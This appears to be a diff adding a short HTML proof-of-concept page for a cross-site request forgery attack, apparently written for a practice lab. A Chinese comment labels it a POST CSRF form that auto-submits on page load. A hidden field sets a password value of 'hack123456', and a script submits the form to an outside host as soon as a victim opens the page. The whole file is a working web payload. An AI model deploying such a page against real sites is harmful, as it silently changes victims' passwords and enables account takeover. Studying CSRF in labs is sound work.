@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<!-- POST型CSRF表单，页面加载自动提交 -->
+<form action="http://6rbetfm.haobachang1.loveli.com.cn:8888/" method="POST" id="csrf_form">
+    <input type="hidden" name="pwd" value="hack123456">
+</form>
+<script>
+window.onload = function(){
+    document.getElementById("csrf_form").submit();
+}
+</script>
+</body>
+</html>
